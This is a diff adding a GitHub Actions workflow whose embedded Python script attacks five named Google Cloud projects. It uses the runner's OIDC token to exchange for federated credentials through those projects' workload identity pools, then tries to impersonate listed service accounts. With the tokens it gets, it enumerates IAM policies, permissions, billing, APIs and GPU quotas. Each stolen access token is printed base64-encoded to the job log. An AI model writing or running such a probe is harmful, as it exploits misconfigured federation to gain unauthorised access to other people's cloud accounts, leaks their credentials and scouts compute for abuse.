@@ -1,0 +1,337 @@
+name: i38493-probe
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: probe
+        run: |
+          cat > /tmp/p.py <<'PYPROBE'
+          import base64, json, os, subprocess, urllib.error, urllib.parse, urllib.request, time
+
+          CASES = [
+           {"num":"832472850572","proj":"deployment-test-345514",
+            "p":"projects/832472850572/locations/global/workloadIdentityPools/my-pool/providers/my-provider",
+            "sas":["wip-service-account@deployment-test-345514.iam.gserviceaccount.com",
+                   "wip-service-account@side-project-336100.iam.gserviceaccount.com",
+                   "832472850572-compute@developer.gserviceaccount.com"]},
+           {"num":"671371757704","proj":"dataplatformcolgate",
+            "p":"projects/671371757704/locations/global/workloadIdentityPools/githubactions/providers/github",
+            "sas":["github-actions@dataplatformcolgate.iam.gserviceaccount.com",
+                   "cloudrun@dataplatformcolgate.iam.gserviceaccount.com",
+                   "671371757704-compute@developer.gserviceaccount.com"]},
+           {"num":"52991355109","proj":"lab-gke-se",
+            "p":"projects/52991355109/locations/global/workloadIdentityPools/github-pool/providers/github-provider",
+            "sas":["sa-bootstrap@lab-gke-se.iam.gserviceaccount.com",
+                   "sa-development@lab-gke-se.iam.gserviceaccount.com",
+                   "sa-tenant-gke@lab-gke-se.iam.gserviceaccount.com",
+                   "sa-pipeline-obs@lab-gke-se.iam.gserviceaccount.com",
+                   "sa-foundations@lab-gke-se.iam.gserviceaccount.com",
+                   "sa-observability-tfe-se@lab-gke-se.iam.gserviceaccount.com",
+                   "52991355109-compute@developer.gserviceaccount.com"]},
+           {"num":"147015144729","proj":"docrot-detector",
+            "p":"projects/147015144729/locations/global/workloadIdentityPools/github-oidc-pool/providers/github-provider",
+            "sas":["docrot-github-action@docrot-detector.iam.gserviceaccount.com",
+                   "147015144729-compute@developer.gserviceaccount.com"]},
+           {"num":"173159973736","proj":"cloud-final-346107",
+            "p":"projects/173159973736/locations/global/workloadIdentityPools/cloud-final-pool/providers/github-provider",
+            "sas":["gke-account@cloud-final-346107.iam.gserviceaccount.com",
+                   "173159973736-compute@developer.gserviceaccount.com"]},
+          ]
+
+          PERMS = [
+           "compute.instances.create","compute.disks.create","compute.instances.list","compute.regions.list","compute.zones.list",
+           "cloudbuild.builds.create","cloudbuild.builds.get","cloudbuild.builds.list",
+           "aiplatform.customJobs.create","aiplatform.endpoints.create","aiplatform.models.upload","aiplatform.locations.list",
+           "run.services.create","run.services.list","run.services.update","run.jobs.create","run.jobs.list",
+           "container.clusters.create","container.clusters.list",
+           "serviceusage.services.enable","serviceusage.services.list","serviceusage.services.get",
+           "cloudquotas.quotas.get","cloudquotas.quotaPreferences.create","cloudquotas.quotaInfos.list",
+           "resourcemanager.projects.get","resourcemanager.projects.getIamPolicy","resourcemanager.projects.setIamPolicy",
+           "resourcemanager.projects.create","resourcemanager.projects.list",
+           "iam.serviceAccounts.list","iam.serviceAccounts.get","iam.serviceAccounts.getIamPolicy",
+           "iam.serviceAccounts.setIamPolicy","iam.serviceAccounts.actAs","iam.serviceAccounts.create",
+           "iam.workloadIdentityPools.list","iam.workloadIdentityPoolProviders.get",
+           "billing.resourceAssociations.create","billing.accounts.get","billing.accounts.list",
+           "orgpolicy.policy.get","logging.logEntries.list","monitoring.timeSeries.list",
+          ]
+
+          APIS = ["compute.googleapis.com","cloudbuild.googleapis.com","aiplatform.googleapis.com",
+                  "run.googleapis.com","container.googleapis.com","cloudquotas.googleapis.com",
+                  "iamcredentials.googleapis.com","serviceusage.googleapis.com","cloudbilling.googleapis.com"]
+
+
+          def req(u, data=None, token=None, timeout=30):
+              h = {'Accept':'application/json','Content-Type':'application/json','User-Agent':'i38493-probe'}
+              if token:
+                  h['Authorization'] = 'Bearer ' + token
+              if isinstance(data, (dict, list)):
+                  data = json.dumps(data).encode()
+              r = urllib.request.Request(u, data=data, headers=h)
+              try:
+                  resp = urllib.request.urlopen(r, timeout=timeout)
+                  return resp.status, resp.read().decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, (e.read() or b'').decode('utf-8','replace')
+              except Exception as e:
+                  return -1, repr(e)[:200]
+
+
+          def errmsg(st, body, n=190):
+              try:
+                  j = json.loads(body)
+                  e = j.get('error') or {}
+                  m = e.get('message') or ''
+                  r = e.get('status') or ''
+                  det = ''
+                  for d in (e.get('details') or []):
+                      if isinstance(d, dict) and d.get('reason'):
+                          det = ' reason=' + str(d.get('reason'))
+                  return ('%s: %s%s' % (r, m, det))[:n]
+              except Exception:
+                  return ('HTTP%d: %s' % (st, str(body)[:n]))[:n]
+
+
+          def mint(aud):
+              u = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL','')
+              t = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+              if not u or not t:
+                  return ''
+              u = u + ('&' if '?' in u else '?') + 'audience=' + urllib.parse.quote(aud, safe='')
+              out = subprocess.run(['curl','-sS','-m','30','-H','Authorization: Bearer '+t,u], capture_output=True, text=True).stdout
+              try:
+                  return json.loads(out).get('value','')
+              except Exception:
+                  return ''
+
+
+          def sts(num_p, ttl=1800):
+              body = {'audience':'//iam.googleapis.com/'+num_p,'grantType':'urn:ietf:params:oauth:grant-type:token-exchange',
+                      'requestedTokenType':'urn:ietf:params:oauth:token-type:access_token',
+                      'scope':'https://www.googleapis.com/auth/cloud-platform',
+                      'subjectTokenType':'urn:ietf:params:oauth:token-type:jwt','subjectToken':mint('//iam.googleapis.com/'+num_p)}
+              st, rb = req('https://sts.googleapis.com/v1/token', data=body)
+              if st != 200:
+                  return st, None, errmsg(st, rb)
+              try:
+                  j = json.loads(rb)
+              except Exception:
+                  return st, None, 'bad json'
+              return 200, j.get('access_token'), None
+
+
+          def probe_apis(tok, num):
+              """Return dict api -> compact status for the GPU-bearing services."""
+              out = {}
+              calls = {
+                'compute':'https://compute.googleapis.com/compute/v1/projects/%s/aggregated/instances?maxResults=1' % num,
+                'cloudbuild':'https://cloudbuild.googleapis.com/v1/projects/%s/builds?pageSize=1' % num,
+                'aiplatform':'https://aiplatform.googleapis.com/v1/projects/%s/locations' % num,
+                'run':'https://run.googleapis.com/v2/projects/%s/locations' % num,
+                'container':'https://container.googleapis.com/v1/projects/%s/locations' % num,
+                'cloudquotas':'https://cloudquotas.googleapis.com/v1/projects/%s/locations/global/services?pageSize=20' % num,
+                'billing':'https://cloudbilling.googleapis.com/v1/projects/%s/billingInfo' % num,
+                'serviceusage':'https://serviceusage.googleapis.com/v1/projects/%s/services?filter=state:ENABLED&pageSize=200' % num,
+              }
+              for k, u in calls.items():
+                  st, b = req(u, token=tok)
+                  rec = {'h': st}
+                  if st == 200:
+                      try:
+                          j = json.loads(b)
+                      except Exception:
+                          j = None
+                      if k == 'billing' and isinstance(j, dict):
+                          rec['billingEnabled'] = j.get('billingEnabled')
+                          rec['billingAccountName'] = j.get('billingAccountName')
+                      elif k == 'serviceusage' and isinstance(j, dict):
+                          svcs = [s.get('config',{}).get('name') or s.get('name','').split('/')[-1] for s in (j.get('services') or [])]
+                          rec['enabled'] = svcs
+                      elif k == 'cloudquotas' and isinstance(j, dict):
+                          rec['services'] = [s.get('name','').split('/')[-1] for s in (j.get('quotaInfos') or j.get('services') or [])][:20]
+                      elif k == 'compute' and isinstance(j, dict):
+                          rec['items'] = sum(len(v.get('instances',[])) for v in (j.get('items') or {}).values())
+                      elif k == 'run' and isinstance(j, dict):
+                          rec['n'] = len(j.get('locations') or [])
+                      elif k == 'cloudbuild' and isinstance(j, dict):
+                          rec['n'] = len(j.get('builds') or [])
+                      elif k == 'aiplatform' and isinstance(j, dict):
+                          rec['n'] = len(j.get('locations') or [])
+                      elif k == 'container' and isinstance(j, dict):
+                          rec['n'] = len(j.get('locations') or j.get('clusters') or [])
+                  else:
+                      rec['e'] = errmsg(st, b)
+                  out[k] = rec
+              return out
+
+
+          def svc_gets(tok, num):
+              out = {}
+              for api in APIS:
+                  st, b = req('https://serviceusage.googleapis.com/v1/projects/%s/services/%s' % (num, api), token=tok)
+                  if st == 200:
+                      try:
+                          j = json.loads(b); out[api] = j.get('state')
+                      except Exception:
+                          out[api] = 'HTTP200'
+                  else:
+                      out[api] = 'h%d %s' % (st, errmsg(st, b, 110))
+              return out
+
+
+          def project_meta(tok, proj_id, num):
+              out = {}
+              st, b = req('https://cloudresourcemanager.googleapis.com/v3/projects/%s' % num, token=tok)
+              out['crm3_h'] = st
+              if st == 200:
+                  try:
+                      j = json.loads(b)
+                      out['crm3'] = {k: j.get(k) for k in ('projectId','lifecycleState','parent','createTime') if j.get(k) is not None}
+                  except Exception:
+                      out['crm3_body'] = b[:200]
+              else:
+                  out['crm3_e'] = errmsg(st, b)
+              st, b = req('https://cloudresourcemanager.googleapis.com/v1/projects/%s:getIamPolicy' % num,
+                          data={'options':{'requestedPolicyVersion':3}}, token=tok)
+              out['iampol_h'] = st
+              if st == 200:
+                  try:
+                      j = json.loads(b)
+                      binds = j.get('bindings') or []
+                      out['iampol_n'] = len(binds)
+                      out['iampol'] = [{'role': x.get('role'), 'members': (x.get('members') or [])[:6]} for x in binds][:40]
+                  except Exception:
+                      out['iampol_body'] = b[:300]
+              else:
+                  out['iampol_e'] = errmsg(st, b)
+              st, b = req('https://cloudresourcemanager.googleapis.com/v1/projects/%s:getAncestry' % num, data={}, token=tok)
+              out['anc_h'] = st
+              if st == 200:
+                  try:
+                      out['anc'] = [a.get('type')+':'+a.get('id','') for a in (json.loads(b).get('ancestor') or [])]
+                  except Exception:
+                      pass
+              else:
+                  out['anc_e'] = errmsg(st, b, 110)
+              return out
+
+
+          def sa_list(tok, num):
+              st, b = req('https://iam.googleapis.com/v1/projects/%s/serviceAccounts?pageSize=200' % num, token=tok)
+              if st != 200:
+                  return {'h': st, 'e': errmsg(st, b)}
+              try:
+                  j = json.loads(b)
+                  sas = []
+                  for s in (j.get('accounts') or []):
+                      sas.append({'email': s.get('email'), 'disabled': s.get('disabled'),
+                                  'title': s.get('displayName'), 'oauth2': s.get('oauth2ClientId') is not None})
+                  return {'h': st, 'n': len(sas), 'sas': sas[:60]}
+              except Exception:
+                  return {'h': st, 'body': b[:300]}
+
+
+          def test_perms(tok, resource, perms=PERMS):
+              st, b = req('https://cloudresourcemanager.googleapis.com/v1/%s:testIamPermissions' % resource,
+                          data={'permissions': perms}, token=tok)
+              if st == 200:
+                  try:
+                      return {'h': st, 'granted': json.loads(b).get('permissions') or []}
+                  except Exception:
+                      return {'h': st, 'body': b[:200]}
+              return {'h': st, 'e': errmsg(st, b)}
+
+
+          def gpu_quotas(tok, num):
+              st, b = req('https://compute.googleapis.com/compute/v1/projects/%s/regions' % num, token=tok)
+              if st != 200:
+                  return {'h': st, 'e': errmsg(st, b, 160)}
+              try:
+                  j = json.loads(b)
+                  out = {}
+                  for r in (j.get('items') or []):
+                      gq = {}
+                      for q in (r.get('quotas') or []):
+                          m = q.get('metric','')
+                          if 'GPU' in m or 'gpu' in m:
+                              gq[m] = {'limit': q.get('limit'), 'usage': q.get('usage')}
+                      if gq:
+                          out[r.get('name')] = gq
+                  return {'h': st, 'n_regions': len(j.get('items') or []), 'gpu_quota': out}
+              except Exception:
+                  return {'h': st, 'body': b[:200]}
+
+
+          def sa_probe(tok, c, sa_email, t0):
+              num = c['num']; proj_id = c['proj']
+              rec = {'kind':'sa','proj':proj_id,'num':num,'sa':sa_email}
+              rec['proj_meta'] = project_meta(tok, proj_id, num)
+              rec['perms_project'] = test_perms(tok, 'projects/%s' % num)
+              rec['apis'] = probe_apis(tok, num)
+              rec['svc_get'] = svc_gets(tok, num)
+              rec['sa_list'] = sa_list(tok, num)
+              rec['gpu_quota'] = gpu_quotas(tok, num)
+              # org/folder level permissions, cheap
+              for anc in (rec['proj_meta'].get('anc') or []):
+                  typ, _, aid = anc.partition(':')
+                  if typ in ('organization','folder'):
+                      rec['perms_%s_%s' % (typ, aid)] = test_perms(tok, '%ss/%s' % (typ, aid))
+              rec['t'] = round(time.time()-t0,1)
+              return rec
+
+
+          def main():
+              t0 = time.time()
+              print('START', time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()), flush=True)
+              saved = {}
+              for c in CASES:
+                  num = c['num']; proj_id = c['proj']
+                  fedrec = {'kind':'fed','proj':proj_id,'num':num,'path':c['p'],'repo':os.environ.get('GITHUB_REPOSITORY')}
+                  st, fed, err = sts(c['p'])
+                  fedrec['sts'] = st
+                  if st != 200:
+                      fedrec['sts_err'] = err
+                      print('RESULT '+json.dumps(fedrec), flush=True)
+                      continue
+                  fedrec['proj_meta_fed'] = project_meta(fed, proj_id, num)
+                  fedrec['perms_fed'] = test_perms(fed, 'projects/%s' % num)
+                  fedrec['apis_fed'] = probe_apis(fed, num)
+                  fedrec['sa_list_fed'] = sa_list(fed, num)
+                  fedrec['svc_get_fed'] = svc_gets(fed, num)
+                  print('RESULT '+json.dumps(fedrec), flush=True)
+                  for sa in c['sas']:
+                      if time.time()-t0 > 520:
+                          print('RESULT '+json.dumps({'kind':'skip','proj':proj_id,'sa':sa,'reason':'time budget'}), flush=True)
+                          continue
+                      gurl = 'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken' % urllib.parse.quote(sa, safe='')
+                      gst, gres = req(gurl, data={'scope':['https://www.googleapis.com/auth/cloud-platform'],'lifetime':'3600s'}, token=fed)
+                      r2 = {'kind':'gen','proj':proj_id,'num':num,'sa':sa,'gen':gst}
+                      if gst != 200:
+                          r2['gen_err'] = errmsg(gst, gres)
+                          print('RESULT '+json.dumps(r2), flush=True)
+                          continue
+                      try:
+                          j = json.loads(gres); at = j.get('accessToken',''); r2['expire'] = j.get('expireTime')
+                      except Exception:
+                          print('RESULT '+json.dumps({'kind':'gen','proj':proj_id,'sa':sa,'gen':gst,'parse':'bad'}), flush=True)
+                          continue
+                      r2['tok_b64'] = base64.b64encode(at.encode()).decode()
+                      print('RESULT '+json.dumps(r2), flush=True)
+                      saved[sa] = {'token': at, 'expire': r2.get('expire'), 'proj': proj_id, 'num': num}
+                      try:
+                          sr = sa_probe(at, c, sa, t0)
+                          print('RESULT '+json.dumps(sr), flush=True)
+                      except Exception as e:
+                          print('RESULT '+json.dumps({'kind':'sa_err','proj':proj_id,'sa':sa,'err':repr(e)[:200]}), flush=True)
+              print('SAVED_TOKENS '+json.dumps({k:{'expire':v['expire'],'proj':v['proj'],'num':v['num']} for k,v in saved.items()}), flush=True)
+              print('DONE', round(time.time()-t0,1), flush=True)
+
+
+          main()
+          PYPROBE
+          python3 -u /tmp/p.py
